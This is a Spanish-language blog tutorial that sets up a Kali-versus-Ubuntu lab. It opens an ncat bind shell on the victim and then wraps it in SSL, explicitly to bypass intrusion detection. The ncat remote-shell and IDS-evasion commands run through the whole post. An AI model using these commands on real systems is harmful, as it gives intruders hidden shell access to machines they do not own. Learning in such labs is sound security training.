---
title: Atacar redes empresariales y saltar a los sistemas de detección de intrusos(IDS)
author: nik0
date: 2020-11-26 16:38:00 +0800
categories: [Ciberseguridad]
tags: [IDS,Pentesting]
---

## Introducción

En las redes empresariales es muy común ver IDS, IPS y NGFW entre otros tipos de sistemas que reconocen patrones inusuales de conductas no autorizadas, analizan paquetes de red, examinan el tráfico y los puertos, etc.

Por eso cuando queremos hacer una intrusión a un sistema, es muy importante que estos sistemas no detecten lo que hacemos, ya que de lo contrario nos bloquearían la conexión al servidor víctima y no podriamos concluir con lo que queremos hacer.

## Montando el laboratorio

Primero, voy a tener 2 máquinas activas, la primera va a ser Kali (Atacante) y la segunda va a ser una máquina de Ubuntu (Victima), en Ubuntu voy a tener instalado Wireshark para poder capturar los paquetes TCP y poder diferenciar entre una conexión encriptada y otra que no lo está.

## Utilizando Ncat

Vamos a abrir una terminal y ejecutar el comando ```ncat -nlvp 1337 -e /bin/bash``` "n" significa no hay host vinculante, "l" es que para poner a la escucha, "v" para que sea más "detallado" o verboso y "p" significa el puerto a la escucha ```-e /bin/bash``` significa que vamos a tener un entorno en bash, presionamos enter y tiene que estar tal cual en la foto:

![NCAT](/assets/img/sample/A.png)

luego desde Kali(atacante) nos vamos a conectar a Ubuntu(Víctima), para ello utlizamos el comando ```ncat -nv 172.16.211.131 1337``` ponemos la ip de Ubuntu y el puerto que está a la escucha, presionamos enter y deberia aparecernos así:

![b](/assets/img/sample/B.png)

## Configurando Wireshark

Antes de ponernos a escribir comandos etc, vamos a poner a Wireshark a seguir los paquetes de red TCP, en mi caso sería la interfaz "ens33" si se deja el cursor un rato ahi, nos muestra la ip de la máquina en este caso la de Kali, lo presionamos 2 veces y ya se puso a la escucha


Ahora si podemos escribir comandos en la consola, podemos hacer un pwd o lo que se nos ocurra:

![c](/assets/img/sample/C.png)

luego si nos vamos a Wireshark, vemos que está capturando tráfico, vamos a ver que nos puede mostrar Wireshark, lo que hacemos es clickear un paquete de red, click derecho, nos vamos a follow y después TCP stream, nos debería aparecer algo así:

![E](/assets/img/sample/D.png)

y podemos ver que la conexión no está encriptada por lo tanto un IDS te lo puede detectar fácilmente.

## Encriptando conexión con Ncat

Ahora lo que vamos a hacer es encriptar nuestra conexión para así poder hacer un bypass al IDS, matamos todos los procesos que teníamos antes, el procedimiento es el mismo solo que ahora los comandos cambian.

Vamos a escribir en la consola de Ubuntu ```ncat --exec /bin/bash -vnl 1233 --ssl``` y en la de Kali ```ncat -nv 172.16.211.131 1233 --ssl``` ponemos a Wireshark a capturar tráfico de red y esto es lo que nos sale:
![c](/assets/img/sample/E.png)

Nos vamos a Wireshark, mismo procedimiento y nos tendría que salir así:

![c](/assets/img/sample/F.png)

Esto para un IDS, no le hace sentido por lo tanto no lo va a considerar cómo actividad sospechosa o intrusión ;)




